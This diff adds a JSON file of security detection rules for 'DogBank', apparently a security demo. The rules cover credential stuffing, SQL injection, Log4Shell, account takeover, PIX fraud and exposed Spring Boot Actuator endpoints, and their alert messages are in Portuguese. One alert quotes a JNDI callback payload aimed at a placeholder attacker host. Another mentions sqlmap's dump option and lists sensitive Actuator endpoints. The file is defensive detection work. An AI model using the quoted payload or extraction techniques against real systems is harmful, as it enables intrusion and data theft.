@@ -1,0 +1,257 @@
+[
+  {
+    "name": "[DogBank] Brute Force — Credential Stuffing (ATO)",
+    "enabled": true,
+    "type": "log_detection",
+    "queries": [
+      {
+        "query": "@appsec.events.users.login.failure.usr.exists:true service:auth-service",
+        "aggregation": "count",
+        "groupByFields": ["@network.client.ip"],
+        "name": "failures"
+      },
+      {
+        "query": "@appsec.events.users.login.success service:auth-service",
+        "aggregation": "count",
+        "groupByFields": ["@network.client.ip"],
+        "name": "successes"
+      }
+    ],
+    "cases": [
+      {
+        "name": "CRITICAL — Credential stuffing com sucesso (ATO)",
+        "status": "critical",
+        "condition": "failures > 10 && successes >= 1",
+        "notifications": []
+      },
+      {
+        "name": "HIGH — Brute force em andamento",
+        "status": "high",
+        "condition": "failures > 10",
+        "notifications": []
+      }
+    ],
+    "options": {
+      "evaluationWindow": 600,
+      "keepAlive": 3600,
+      "maxSignalDuration": 86400
+    },
+    "message": "## 🚨 Credential Stuffing / Brute Force Detectado\n\n**IP do atacante:** {{@network.client.ip}}\n**Falhas de login:** {{failures}}\n**Logins bem-sucedidos:** {{successes}}\n**Serviço:** auth-service | **Env:** dogbank\n\n**CVE/CWE:** CWE-307 — Improper Restriction of Excessive Authentication Attempts\n\n**Impacto real:** Se `successes >= 1`, o atacante obteve acesso a uma conta válida e pode:\n- Consultar saldo e extrato\n- Realizar transferências PIX\n- Exportar dados pessoais da vítima\n\n**Ação imediata:**\n1. Bloquear IP na Denylist: Security > Policies > Denylist\n2. Resetar senhas das contas afetadas\n3. Notificar usuários comprometidos\n\n@pedro.schawirin@datadoghq.com",
+    "tags": [
+      "env:dogbank",
+      "service:auth-service",
+      "attack:brute-force",
+      "attack:credential-stuffing",
+      "cwe:307",
+      "tactic:credential-access",
+      "team:security-demo"
+    ]
+  },
+
+  {
+    "name": "[DogBank] SQL Injection — Tentativa de extração de dados",
+    "enabled": true,
+    "type": "application_security",
+    "queries": [
+      {
+        "query": "@appsec.type:sql_injection service:auth-service",
+        "aggregation": "count",
+        "groupByFields": ["@network.client.ip"],
+        "name": "sqli_attempts"
+      }
+    ],
+    "cases": [
+      {
+        "name": "CRITICAL — SQLi automatizado (sqlmap)",
+        "status": "critical",
+        "condition": "sqli_attempts > 10",
+        "notifications": []
+      },
+      {
+        "name": "HIGH — SQLi manual detectado",
+        "status": "high",
+        "condition": "sqli_attempts > 0",
+        "notifications": []
+      }
+    ],
+    "options": {
+      "evaluationWindow": 300,
+      "keepAlive": 3600,
+      "maxSignalDuration": 86400
+    },
+    "message": "## 🚨 SQL Injection Detectado no DogBank\n\n**IP do atacante:** {{@network.client.ip}}\n**Tentativas:** {{sqli_attempts}} em 5 minutos\n**Endpoint alvo:** {{@http.url}}\n**Payload:** {{@appsec.security.payload}}\n\n**CVE/CWE:** CWE-89 / OWASP A03:2021 — Injection\n\n**Impacto real:** Via SQLi no parâmetro `cpf` do endpoint de login, o atacante pode:\n- Extrair tabela `users` completa (CPFs, senhas, emails)\n- Extrair tabela `transactions` (histórico de PIX)\n- Extrair saldos de todos os clientes\n- Com `--dump`: exportar banco inteiro\n\n**Ação imediata:**\n1. Bloquear IP na Denylist\n2. Verificar dados exfiltrados nos logs\n3. Corrigir: usar prepared statements no AuthController.java\n\n@pedro.schawirin@datadoghq.com",
+    "tags": [
+      "env:dogbank",
+      "service:auth-service",
+      "attack:sql-injection",
+      "cwe:89",
+      "owasp:a03-2021",
+      "team:security-demo"
+    ]
+  },
+
+  {
+    "name": "[DogBank] Log4Shell CVE-2021-44228 — JNDI Injection",
+    "enabled": true,
+    "type": "application_security",
+    "queries": [
+      {
+        "query": "@appsec.type:log4shell service:auth-service",
+        "aggregation": "count",
+        "groupByFields": ["@network.client.ip"],
+        "name": "log4shell_hits"
+      }
+    ],
+    "cases": [
+      {
+        "name": "CRITICAL — Log4Shell payload confirmado",
+        "status": "critical",
+        "condition": "log4shell_hits > 0",
+        "notifications": []
+      }
+    ],
+    "options": {
+      "evaluationWindow": 60,
+      "keepAlive": 3600,
+      "maxSignalDuration": 86400
+    },
+    "message": "## 🚨 CRÍTICO: Log4Shell (CVE-2021-44228) Detectado\n\n**IP do atacante:** {{@network.client.ip}}\n**Payload JNDI:** {{@appsec.security.payload}}\n**Header injetado:** {{@http.request.headers.user-agent}}\n**CVSS Score:** 10.0 (máximo)\n\n**CVE:** CVE-2021-44228 — Apache Log4j2 Remote Code Execution\n**NVD:** https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n\n**Impacto real:** O payload `${jndi:ldap://attacker/exploit}` faz o servidor Log4j executar uma chamada LDAP de volta ao atacante, permitindo:\n- Execução remota de código (RCE) no servidor\n- Roubo de variáveis de ambiente (`AWS_ACCESS_KEY`, `DB_PASSWORD`, etc.)\n- Instalação de backdoor / reverse shell\n- Movimentação lateral na rede interna\n\n**Ação imediata:**\n1. Bloquear IP IMEDIATAMENTE na Denylist\n2. Isolar o pod/container afetado\n3. Revogar credenciais de cloud (AWS, GCP)\n4. Atualizar Log4j para >= 2.17.1\n\n@pedro.schawirin@datadoghq.com",
+    "tags": [
+      "env:dogbank",
+      "service:auth-service",
+      "attack:log4shell",
+      "cve:2021-44228",
+      "cvss:10.0",
+      "tactic:initial-access",
+      "team:security-demo"
+    ]
+  },
+
+  {
+    "name": "[DogBank] Post-Exploit Kill Chain — Exploit + Ação Autenticada",
+    "enabled": true,
+    "type": "log_detection",
+    "queries": [
+      {
+        "query": "@appsec.type:(sql_injection OR log4shell OR command_injection) service:auth-service",
+        "aggregation": "count",
+        "groupByFields": ["@network.client.ip"],
+        "name": "exploits"
+      },
+      {
+        "query": "@evt.name:users.login.success service:auth-service",
+        "aggregation": "count",
+        "groupByFields": ["@network.client.ip"],
+        "name": "auth_actions"
+      }
+    ],
+    "cases": [
+      {
+        "name": "CRITICAL — Kill chain completo: exploit + acesso autenticado",
+        "status": "critical",
+        "condition": "exploits >= 1 && auth_actions >= 1",
+        "notifications": []
+      }
+    ],
+    "options": {
+      "evaluationWindow": 300,
+      "keepAlive": 3600,
+      "maxSignalDuration": 86400
+    },
+    "message": "## 🚨 KILL CHAIN DETECTADO — Exploit seguido de Account Takeover\n\n**IP do atacante:** {{@network.client.ip}}\n**Exploits disparados:** {{exploits}}\n**Ações autenticadas após exploit:** {{auth_actions}}\n\n**O que aconteceu (sequência):**\n1. Atacante usou SQLi ou Log4Shell contra auth-service\n2. **O mesmo IP** depois conseguiu autenticar com sucesso\n3. Isso indica que o exploit forneceu credenciais ou token válido\n\n**Impacto:** Account takeover ativo. O atacante está operando como um usuário legítimo AGORA.\n\n**Ação imediata — URGENTE:**\n1. Bloquear IP na Denylist imediatamente\n2. Invalidar todos os tokens JWT ativos deste IP\n3. Verificar transações PIX realizadas após o exploit\n4. Acionar resposta a incidente\n\n@pedro.schawirin@datadoghq.com",
+    "tags": [
+      "env:dogbank",
+      "service:auth-service",
+      "attack:kill-chain",
+      "attack:account-takeover",
+      "tactic:lateral-movement",
+      "tactic:exfiltration",
+      "team:security-demo"
+    ]
+  },
+
+  {
+    "name": "[DogBank] PIX Fraudulento — Alto valor após login suspeito",
+    "enabled": true,
+    "type": "log_detection",
+    "queries": [
+      {
+        "query": "@evt.name:users.login.success service:auth-service",
+        "aggregation": "count",
+        "groupByFields": ["@usr.id"],
+        "name": "logins"
+      },
+      {
+        "query": "service:transaction-service @http.url:*pix* @transaction.amount:>1000",
+        "aggregation": "sum",
+        "metric": "@transaction.amount",
+        "groupByFields": ["@usr.id"],
+        "name": "pix_total"
+      }
+    ],
+    "cases": [
+      {
+        "name": "HIGH — PIX de alto valor imediatamente após login",
+        "status": "high",
+        "condition": "logins >= 1 && pix_total >= 1",
+        "notifications": []
+      }
+    ],
+    "options": {
+      "evaluationWindow": 120,
+      "keepAlive": 3600,
+      "maxSignalDuration": 86400
+    },
+    "message": "## 💸 PIX Suspeito Após Login\n\n**Usuário:** {{@usr.id}}\n**Total movimentado via PIX:** R$ {{pix_total}}\n**Logins recentes:** {{logins}}\n**Janela de tempo:** 2 minutos\n\n**CWE:** CWE-840 — Business Logic Errors\n\n**Contexto:** Um login bem-sucedido foi seguido de transferência PIX em menos de 2 minutos. Padrão típico de account takeover onde o atacante:\n1. Obteve credenciais via brute force ou phishing\n2. Logou imediatamente\n3. Realizou transferência antes que o usuário perceba\n\n**Ação:** Revisar a transação PIX e contatar o cliente.\n\n@pedro.schawirin@datadoghq.com",
+    "tags": [
+      "env:dogbank",
+      "service:transaction-service",
+      "attack:account-takeover",
+      "attack:fraud",
+      "cwe:840",
+      "tactic:exfiltration",
+      "team:security-demo"
+    ]
+  },
+
+  {
+    "name": "[DogBank] Spring Boot Actuator — Acesso não autorizado",
+    "enabled": true,
+    "type": "log_detection",
+    "queries": [
+      {
+        "query": "@http.url:*/actuator* @http.status_code:200",
+        "aggregation": "count",
+        "groupByFields": ["@network.client.ip"],
+        "name": "actuator_hits"
+      }
+    ],
+    "cases": [
+      {
+        "name": "HIGH — Actuator exposto e acessado externamente",
+        "status": "high",
+        "condition": "actuator_hits > 3",
+        "notifications": []
+      },
+      {
+        "name": "MEDIUM — Acesso ao Actuator detectado",
+        "status": "medium",
+        "condition": "actuator_hits > 0",
+        "notifications": []
+      }
+    ],
+    "options": {
+      "evaluationWindow": 300,
+      "keepAlive": 3600,
+      "maxSignalDuration": 86400
+    },
+    "message": "## ⚠️ Spring Boot Actuator Exposto Publicamente\n\n**IP do requisitante:** {{@network.client.ip}}\n**Acessos:** {{actuator_hits}} endpoints em 5 minutos\n**Endpoint:** {{@http.url}}\n\n**CWE:** CWE-200 — Exposure of Sensitive Information\n**OWASP:** A05:2021 — Security Misconfiguration\n\n**Endpoints mais perigosos expostos:**\n- `/actuator/env` — variáveis de ambiente (senhas, API keys)\n- `/actuator/heapdump` — dump da memória JVM (tokens, dados de usuários)\n- `/actuator/beans` — estrutura interna da aplicação\n- `/actuator/mappings` — todos os endpoints da API\n\n**Ação:** Restringir acesso ao Actuator por IP ou desabilitar em produção.\n\n@pedro.schawirin@datadoghq.com",
+    "tags": [
+      "env:dogbank",
+      "attack:recon",
+      "cwe:200",
+      "owasp:a05-2021",
+      "team:security-demo"
+    ]
+  }
+]
